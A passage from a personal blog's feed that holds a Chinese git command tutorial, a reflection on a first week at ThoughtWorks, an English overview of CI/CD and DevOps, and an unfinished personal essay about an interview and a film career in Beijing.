&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;git status #查看工作区状态&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git diff #查看代码更改&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git log  #查看提交日志&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&quot;版本回退&quot;&gt;&lt;a href=&quot;#版本回退&quot; class=&quot;headerlink&quot; title=&quot;版本回退&quot;&gt;&lt;/a&gt;版本回退&lt;/h4&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;git reflog #查看所有日志，包含head信息&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git reset --hard HEAD^ 会退到上一版本&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git reset --hard &amp;lt;commit_id&amp;gt; 会退到指定版本&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;撤销工作区修改：    &lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;git checkout -- file&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&quot;远程仓库&quot;&gt;&lt;a href=&quot;#远程仓库&quot; class=&quot;headerlink&quot; title=&quot;远程仓库&quot;&gt;&lt;/a&gt;远程仓库&lt;/h4&gt;&lt;p&gt;这里以github为例&lt;br&gt;从远程仓库克隆代码:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;git clone https://github.com/username/projectname.git&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;如果想讲本地已有的代码推送到远程，则需要跟远程费分支建立连接&lt;br&gt;与远程分支建立联系，需要remote origin&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;git remote add origin https://github.com/username/projectname.git #添加远程分支&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git push origin master #推送本地origin分支到master分支&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;如果提示有冲突，则需要先pull 下来，修改之后再push&lt;/p&gt;
&lt;h4 id=&quot;分支管理&quot;&gt;&lt;a href=&quot;#分支管理&quot; class=&quot;headerlink&quot; title=&quot;分支管理&quot;&gt;&lt;/a&gt;分支管理&lt;/h4&gt;&lt;p&gt;git中，一个分支为一个工作环境，分支与分支之间可以执行创建和合并操作。&lt;br&gt;分支的一般使用：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;git branch # 查看分支&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git branch &amp;lt;name&amp;gt;  # 创建分支&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git checkout &amp;lt;name&amp;gt; # 切换分支&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git checkout -b &amp;lt;name&amp;gt; # 创建并切换分支&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git merge &amp;lt;name&amp;gt; #合并某分支到当前分支&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git branch -d &amp;lt;name&amp;gt; # 删除分支 &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git branch -D &amp;lt;name&amp;gt; # 强行删除分支&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;当更改同时发生在两个分支上，这时候我们有需要对两个分支进行合并，那解决冲突是很容易发生的状况这时候我们需要使用git status 查看状态，执行合并之后在当前分支解决合并冲突问题，在合并就可以了&lt;br&gt;可以使用一下命令查看分支合并情况：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;git log --graph&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&quot;忽略别名&quot;&gt;&lt;a href=&quot;#忽略别名&quot; class=&quot;headerlink&quot; title=&quot;忽略别名&quot;&gt;&lt;/a&gt;忽略别名&lt;/h4&gt;&lt;p&gt;在git中可以通过编辑.gitignore 文件达到控制忽略文件类型的目的，当文件自动不被add 到仓库里。&lt;br&gt;忽略的语法规则：&lt;br&gt;(#)表示注释&lt;br&gt;(*)  表示任意多个字符;&lt;br&gt;(?) 代表一个字符;&lt;br&gt; ([abc]) 代表可选字符范围&lt;br&gt;如果名称最前面是路径分隔符 (/) ，表示忽略的该文件在此目录下。&lt;br&gt;如果名称的最后面是 (/) ，表示忽略整个目录，但同名文件不忽略。&lt;br&gt;通过在名称前面加 (!) ，代表不忽略。&lt;br&gt;例子如下：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;# 这行是注释&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;*.a   # 忽略所有 .a 伟扩展名的文件&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;!lib.a   # 但是 lib.a 不忽略，即时之前设置了	忽略所有的 .a&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;/TODO   # 只忽略此目录下 TODO 文件，子目录的 TODO 不忽略 &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;build/    # 忽略所有的 build/ 目录下文件&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;doc/*.txt    # 忽略如 doc/notes.txt, 但是不忽略如 doc/server/arch.txt&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;关于不同编程语言，通常会有统一的忽略规则，大家可以在这里直接找到配置模板：&lt;br&gt;&lt;a href=&quot;https://github.com/github/gitignore&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/github/gitignore&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;快捷命令配置&quot;&gt;&lt;a href=&quot;#快捷命令配置&quot; class=&quot;headerlink&quot; title=&quot;快捷命令配置&quot;&gt;&lt;/a&gt;快捷命令配置&lt;/h4&gt;&lt;p&gt;在git里可以使用&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;git config --global alias.&amp;lt;shortname&amp;gt; &amp;lt;command_name&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;的方式指定快捷命令，&lt;br&gt;以下为一些常用的快捷命令设置&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;git config --global alias.st status&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git config --global alias.co checkout&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git config --global alias.ci commit&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git config --global alias.br branch&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git config --global alias.unstage &amp;apos;reset HEAD&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git config --global alias.last &amp;apos;log -1&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git config --global alias.lg &amp;quot;log --color --graph --pretty=format:&amp;apos;%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)&amp;lt;%an&amp;gt;%Creset&amp;apos; --abbrev-commit&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;ok ,that’s all&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;代码版本管理工具&quot;&gt;&lt;a href=&quot;#代码版本管理工具&quot; class=&quot;headerlink&quot; title=&quot;代码版本管理工具&quot;&gt;&lt;/a&gt;代码版本管理工具&lt;/h1&gt;&lt;p&gt;在生产环境下的开发过程中，一个工程的代码通常是有多个程序员协同完成，这就涉及到代码在不通终端的同步问题，基于此需求，我们产生了代码版本工具，目前比较主流的两种为git和SVN&lt;br&gt;
    
    </summary>
    
      <category term="worker" scheme="http://adu.404nf.cn/categories/worker/"/>
    
    
      <category term="工具" scheme="http://adu.404nf.cn/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>ThoughtWorks第一周学习总结</title>
    <link href="http://adu.404nf.cn/2016/05/24/ThoughtWorks%E7%AC%AC%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/"/>
    <id>http://adu.404nf.cn/2016/05/24/ThoughtWorks第一周学习总结/</id>
    <published>2016-05-24T13:44:57.000Z</published>
    <updated>2016-05-24T16:22:17.000Z</updated>
    
    <content type="html">&lt;h1 id=&quot;关于一周来学习情况总结&quot;&gt;&lt;a href=&quot;#关于一周来学习情况总结&quot; class=&quot;headerlink&quot; title=&quot;关于一周来学习情况总结&quot;&gt;&lt;/a&gt;关于一周来学习情况总结&lt;/h1&gt;&lt;p&gt;不知不觉进入TW已经一周了，深感自己离成为一个合格的TWer还有很长的距离。在学习的过程中离不开总结和分享，在TW最棒的就是可以随时和身边的技术牛人们分享自己的学习心得，时时总结，有助于梳理自己的知识体系，巩固自己的学习方法。正所谓“时时勤拂拭，莫使惹尘埃”。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;下面就几个关键词进行一个小结：&lt;/p&gt;
&lt;h2 id=&quot;我所除的环境&quot;&gt;&lt;a href=&quot;#我所除的环境&quot; class=&quot;headerlink&quot; title=&quot;我所除的环境&quot;&gt;&lt;/a&gt;我所除的环境&lt;/h2&gt;&lt;h3 id=&quot;ThouhgtWorks显而易见的工作习惯&quot;&gt;&lt;a href=&quot;#ThouhgtWorks显而易见的工作习惯&quot; class=&quot;headerlink&quot; title=&quot;ThouhgtWorks显而易见的工作习惯&quot;&gt;&lt;/a&gt;ThouhgtWorks显而易见的工作习惯&lt;/h3&gt;&lt;p&gt;  1.Email 轰炸&lt;br&gt;  2.Stand metting&lt;br&gt;      就像Align Development里面提到的一样，Stand up, Aline Comstomer 在TW被很好地执行，每日站会是必不可少的&lt;br&gt;  3.频繁的沟通&lt;br&gt;      之前的工作经验告诉我，你只需要写得一手好代码就可以在公司站稳脚跟，但是这点认知在TW被彻底推翻，与代码同样重要的是你的沟通能力，在实际开发过程中，沟通消耗的资源甚至会大于写代码的消耗。&lt;br&gt;  4.Pair-Programming&lt;br&gt;      这也是Align Deployment的重要一环，在TW几乎每一件事都是pair的，这中工作方式可以有效地解决掉“个人英雄”的问题，一段代码出了问题，至少有两个人可以来改这段代码。同时加强了程序员之间的交流，也有利于代码规范的实施。&lt;br&gt;  5.代码洁癖&lt;br&gt;      由于每一段代码都会有人review,这使很多TWer养成了代码洁癖，代码不但要实现功能，还要写得好看，这一点我个人认为也是极好的。&lt;br&gt;  6.频繁的workshop和session&lt;br&gt;  7.无处不在的敏捷&lt;br&gt;    在TW，敏捷已经超越一种开发方式而成为一种文化存在，步步为营，小步前进，似乎是每一个工程师低调而又自信的工作方式。这很好，值得学习：）&lt;/p&gt;
&lt;h2 id=&quot;我面临的问题&quot;&gt;&lt;a href=&quot;#我面临的问题&quot; class=&quot;headerlink&quot; title=&quot;我面临的问题&quot;&gt;&lt;/a&gt;我面临的问题&lt;/h2&gt;&lt;p&gt;工作方式上的问题是很容易适应的，TW有宽松的工作环境和乐于助人的同事。让我吃惊的是我接触到的每一个同事都是健谈而友好的，其中不乏很多大神，所以我一点都不担心自己成长。目前只需要找到自己的短板，针对性的进行一些加强性训练：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1.英文能力
    从进公司到现在，已经从几乎听不懂同事们在说什么到可以看英文文档了，但是英文交流还存在严重的问题，主要表现在无法用英语表达自己所想的内容，另外英文阅读和听力速度还有些跟不上
2.DevOps专业能力
    目前我接触到的DevOps能力主要落实到几个工具的使用上：Jenkins,AWS,ansible,另外还需要掌握vagrant,git,shell,yaml，Linux命令（Vi编辑器命令）对工具来讲，整体不难，拿下英文文档，实际需要的只是操作，后面几个更倾向于需要具备的基本素质才是我目前最需要达到的目标。
3.习惯的建立
    习惯主要分为工作习惯，学习习惯，和生活习惯，这几点在过去的一周几乎是混乱的，这几个习惯应该有一定的准则，概括来说，工作习惯应该是高效可靠，随时可以再session和当前的work中切换自己的状态，那么设计到的内容主要是calendar的管理和mind.txt的优化，我还没有上手公司正式项目，所以目前工作效率优化仅仅停留在自己的事情备忘和计划这个层面。生活习惯，目前来讲主要是健身和游泳，羽毛球视club活动参加，生活应该规律，保证健康的身体和工作时间有一个清醒的大脑。学习习惯是所有习惯中最重要的，主要是根据学习时间，blog时间和阅读时间是每天不可少的内容，希望这些习惯可以再TW贯彻下去.
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;我的应对&quot;&gt;&lt;a href=&quot;#我的应对&quot; class=&quot;headerlink&quot; title=&quot;我的应对&quot;&gt;&lt;/a&gt;我的应对&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;1.关于英语问题，目前的解决方式是阅读MartinFlower的博客，以及每天用英语进行工作总结，尽可能熟悉英文语境以求更好表达自己想表达的东西。
2.DevOps专业能力
    workshop基本只适用于还没有建立起自己学习习惯的人和对一个东西建立初步认识，session也不能对技术提高起到决定性的帮助，频繁的沟通带来的缺点是时间的碎片化，我需要随时跟进自己的一个进程进展到什么程度，有效挂起和有效恢复，才能保证工作和学习同步有效地进行。
    具体来说专业能力的提高除了被动在工作中使用需要用到的技术，跟以前一样，还是要在工作之余对在工作中遇到的问题进行挖掘，弄清楚背后的原理，才能应对同样的问题以及问题的变种。
3.习惯的建立
    工作上和生活上不用花太大心思，生活上只要保证每天早晚各半个小时的锻炼整个人的精气神就会大不一样。周末游泳，这个不用我说自然会有的。    
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;我的决定&quot;&gt;&lt;a href=&quot;#我的决定&quot; class=&quot;headerlink&quot; title=&quot;我的决定&quot;&gt;&lt;/a&gt;我的决定&lt;/h2&gt;&lt;p&gt;基于以上现状以及分析，我的个人时间计划表初步安排如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;7：00 起床
~7：30洗漱，锻炼
~8：00阅读英语，内容为随机选取技术博客活着计划任务一篇
9：00~12：00工作
12：00~13：00阅读一小时
13：00~13：30可以适当午休
14：00~19:00工作，汇报一天的工作
20：00成功降落
晚上：整理白天产生的mind.txt，选取一个技术点blog
    英文能力训练二十分钟，阅读一小时，锻炼半小时
23:00睡觉    
&lt;/code&gt;&lt;/pre&gt;</content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;关于一周来学习情况总结&quot;&gt;&lt;a href=&quot;#关于一周来学习情况总结&quot; class=&quot;headerlink&quot; title=&quot;关于一周来学习情况总结&quot;&gt;&lt;/a&gt;关于一周来学习情况总结&lt;/h1&gt;&lt;p&gt;不知不觉进入TW已经一周了，深感自己离成为一个合格的TWer还有很长的距离。在学习的过程中离不开总结和分享，在TW最棒的就是可以随时和身边的技术牛人们分享自己的学习心得，时时总结，有助于梳理自己的知识体系，巩固自己的学习方法。正所谓“时时勤拂拭，莫使惹尘埃”。&lt;br&gt;
    
    </summary>
    
      <category term="ThoughtWorker" scheme="http://adu.404nf.cn/categories/ThoughtWorker/"/>
    
    
      <category term="敏捷" scheme="http://adu.404nf.cn/tags/%E6%95%8F%E6%8D%B7/"/>
    
      <category term="ThoughtWorks" scheme="http://adu.404nf.cn/tags/ThoughtWorks/"/>
    
  </entry>
  
  <entry>
    <title>CI/CD</title>
    <link href="http://adu.404nf.cn/2016/05/19/CI-CD/"/>
    <id>http://adu.404nf.cn/2016/05/19/CI-CD/</id>
    <published>2016-05-19T12:04:35.000Z</published>
    <updated>2016-05-20T01:54:23.000Z</updated>
    
    <content type="html">&lt;h1 id=&quot;Agile-Development&quot;&gt;&lt;a href=&quot;#Agile-Development&quot; class=&quot;headerlink&quot; title=&quot;Agile Development&quot;&gt;&lt;/a&gt;Agile Development&lt;/h1&gt;&lt;p&gt;before we talk about CI and CD， I think we should figure out why we need them, so we have to talk about Agile Development first.&lt;br&gt;Agile Development is a set of principles for software development. It was develop to response to changing customer’s requirement. As we all know, managers generally desirable to quantify the progress of the development, but quantify of the coding is not easy, the quantify we can only control is the process of the requirment. So we can process a requirement implemented as an iteration cycle of software development.&lt;br&gt;For this purpose, they created with CI and CD as the core of agile development.&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;Continuous-Integration-CI&quot;&gt;&lt;a href=&quot;#Continuous-Integration-CI&quot; class=&quot;headerlink&quot; title=&quot;Continuous Integration(CI)&quot;&gt;&lt;/a&gt;Continuous Integration(CI)&lt;/h2&gt;&lt;p&gt;Continuous Integration means you need to integration at least daily, It’s a development practice that requires developers to integrate code into a shared repository several times a day.”Shared”” means everyone can see what others working on, Frequently compile, test, commit means every times we commit, the code could be running, ideally, every integration should be automated, the unit-test allowing teams to detect problems early. By integration regularly, you can detect errors quickly, and locate them more easily.&lt;br&gt;there are many advantages for Continuous Integration, one of which is the continuous delivery.&lt;/p&gt;
&lt;h2 id=&quot;Continuous-Delivery-CD&quot;&gt;&lt;a href=&quot;#Continuous-Delivery-CD&quot; class=&quot;headerlink&quot; title=&quot;Continuous Delivery(CD)&quot;&gt;&lt;/a&gt;Continuous Delivery(CD)&lt;/h2&gt;&lt;p&gt;Continuous Delivery is customer requirement oriented, It’s like Continuous Integration but more than it, Continuous Delivery is the natural extension of Continuous Integration, Continuous Delivery makes releases boring, so we can deliver frequently and get fast feedback on what users care about.&lt;/p&gt;
&lt;h2 id=&quot;Continuous-Deployment&quot;&gt;&lt;a href=&quot;#Continuous-Deployment&quot; class=&quot;headerlink&quot; title=&quot;Continuous Deployment&quot;&gt;&lt;/a&gt;Continuous Deployment&lt;/h2&gt;&lt;p&gt;Continuous Deployment is more than Continuous Delivery, seams like this:&lt;br&gt; &lt;img src=&quot;https://d1089v03p3mzyq.cloudfront.net/assets/website/continuous-integration-essentials/continuous-delivery-vs-continuous-deployment-b371cf5be55b1c52635058af7b70188cd2b608bfb92ca5487a3e41694e9ccf6b.jpg&quot; alt=&quot;88cd2b608bfb92ca5487a3e41694e9ccf6b.jpg&quot;&gt;&lt;br&gt;It is the practice of keeping your codebase deployable at any point. Beyond making sure your application passes automated tests it has to have all the configuration necessary to push it into production. Many teams then do push changes that pass the automated tests into a test or production environment immediately to ensure a fast development loop.&lt;br&gt;A simplified continuous deployment flow can look like this:&lt;br&gt;&lt;img src=&quot;https://risingstack-blog.s3-eu-west-1.amazonaws.com/2014/Sep/Continuous-deployment---New-Page.png&quot; alt=&quot;New-Page.png&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;Development-Operations-DevOps&quot;&gt;&lt;a href=&quot;#Development-Operations-DevOps&quot; class=&quot;headerlink&quot; title=&quot;Development Operations(DevOps)&quot;&gt;&lt;/a&gt;Development Operations(DevOps)&lt;/h2&gt;&lt;p&gt;Development Operations is bigger than Continuous Deployment, It aims at establishing a culture and environment where building testing, and releasing software, can happen rapidly, and more reliably.&lt;br&gt;In my words, DevOps is a practical form of agile.&lt;/p&gt;
&lt;h2 id=&quot;Tools-for-CI-and-CD&quot;&gt;&lt;a href=&quot;#Tools-for-CI-and-CD&quot; class=&quot;headerlink&quot; title=&quot;Tools for CI and CD&quot;&gt;&lt;/a&gt;Tools for CI and CD&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://jenkins.io/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Jenkins&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.go.cd/download/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;GoCD&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.jetbrains.com/teamcity/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;TeamCity&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://travis-ci.org/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Travis CI&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Agile-Development&quot;&gt;&lt;a href=&quot;#Agile-Development&quot; class=&quot;headerlink&quot; title=&quot;Agile Development&quot;&gt;&lt;/a&gt;Agile Development&lt;/h1&gt;&lt;p&gt;before we talk about CI and CD， I think we should figure out why we need them, so we have to talk about Agile Development first.&lt;br&gt;Agile Development is a set of principles for software development. It was develop to response to changing customer’s requirement. As we all know, managers generally desirable to quantify the progress of the development, but quantify of the coding is not easy, the quantify we can only control is the process of the requirment. So we can process a requirement implemented as an iteration cycle of software development.&lt;br&gt;For this purpose, they created with CI and CD as the core of agile development.&lt;br&gt;
    
    </summary>
    
      <category term="ThoughtWorker" scheme="http://adu.404nf.cn/categories/ThoughtWorker/"/>
    
    
      <category term="敏捷开发" scheme="http://adu.404nf.cn/tags/%E6%95%8F%E6%8D%B7%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>thoughtworks面试</title>
    <link href="http://adu.404nf.cn/2016/04/20/ThoughtWorks%E9%9D%A2%E8%AF%95/"/>
    <id>http://adu.404nf.cn/2016/04/20/ThoughtWorks面试/</id>
    <published>2016-04-20T13:38:11.000Z</published>
    <updated>2016-04-20T14:25:33.000Z</updated>
    
    <content type="html">&lt;p&gt;今天是2016年4月20日&lt;/p&gt;
&lt;p&gt;地点在成都武侯区的一间电梯公寓&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;br&gt;两个小时前，我的心情还无比地紧张。&lt;/p&gt;
&lt;p&gt;明天我将要面试一家最喜欢的公司。&lt;/p&gt;
&lt;p&gt;从电影院走出来，心情居然无比的放松，此刻我的能力已经不可能有太多提升，面试终于成为一场面试。&lt;/p&gt;
&lt;p&gt;好久没有像这一个月一样努力过，虽然回到成都后我一直觉得自己很努力，很努力地去生活，很努力的去忘掉不愉快的北京之行。&lt;/p&gt;
&lt;p&gt;我是为了梦想去北京的。&lt;/p&gt;
&lt;p&gt;有人告诉我，年轻就要去做想做的事，做了才不会后悔。我选择了电影。&lt;/p&gt;
&lt;p&gt;为了梦想，我住过北京三环600块一个月的地下室，和蹲点北影的群演们住在一起，我也当过群演，吃过五毛钱一顿的盒饭，拍过四十块钱一天的网络剧。那时候的我不觉得孤单，我觉得自己在梦想的起点，这些苦逼的经历都会成为未来牛逼的资本。&lt;/p&gt;
&lt;p&gt;可是未来和我呵呵了。&lt;/p&gt;
&lt;p&gt;转眼我得到了一个在剧组工作的机会，工作辛苦是我从来没做过的粗活累活儿，一个月五百块钱，我开心的像个第一次领到工钱的农民工。&lt;/p&gt;
&lt;p&gt;记得有一晚拍夜喜，从来扛不动的高台我终于抗动了，我觉得我胜任了这份工作，摄影掌机在游泳池那头喊：夜宵呢？！！这头有河南的灯光在窃窃私语，不知道为什么，吹着厦门的海风我竟然有些开心。&lt;/p&gt;
&lt;p&gt;转眼到了内蒙古，我见到了成龙大哥，说实话之前对他并没有特别喜欢，只是知道他是个了不起的文化符号，不过近距离接触确实觉得大哥是个很了不起的人，他没有教会我什么。呵呵，让你们失望了。&lt;/p&gt;
&lt;p&gt;北京回来之后，我的同学们都相继开始出去实习，偌大的校园里我每天泡图书馆，欧洲史，电影史，艺术理论。我觉得自己很充实，我觉得生活充满希望，因为北京有一份甚至很多份很好的工作等着我毕业后去做。&lt;/p&gt;
&lt;p&gt;转眼到了毕业。&lt;/p&gt;
&lt;p&gt;来到北京，我开始找工作。&lt;/p&gt;
&lt;p&gt;从两千五一个月的剪辑，我只干了三天，不知道为什么，和老总翻脸了。我至今都觉得这可能是宿命，如果不是那样，我可能现在还在北京，也许还在做剪辑。&lt;/p&gt;
&lt;p&gt;辗转之中我意识到要向做电影，必须得先学习，要学习又要做电影，唯一的路就是进入北京电影学院，在这个过程中我闭门造车，在北京度过了我最艰难的三个月。&lt;/p&gt;
&lt;p&gt;三个月里几乎没有和人说过话。&lt;/p&gt;
